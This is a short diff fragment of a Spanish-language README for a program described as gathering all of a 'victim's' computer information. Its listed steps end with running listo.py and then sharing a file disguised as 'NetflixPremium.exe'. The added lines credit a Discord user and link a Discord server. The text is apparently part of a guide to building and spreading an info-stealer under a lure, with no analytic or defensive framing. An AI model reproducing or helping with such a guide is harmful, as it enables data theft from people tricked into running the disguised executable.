@@ -17,3 +17,6 @@ Programa para obtener toda la información de la víctima (el pc)
 6. Ahora ejecuta el archivo listo.py (revisa si todo se ejecuta correctamente, si no es así, mira este link: https://appuals.com/fix-pip-is-not-recognized-as-an-internal-or-external-command/)
 7. Listo, solo falta compartir el archivo NetflixPremium.exe
 ```
+
+By @cuchillo#7116 (discord)
+Server: https://discord.gg/sfFyhPSY7s
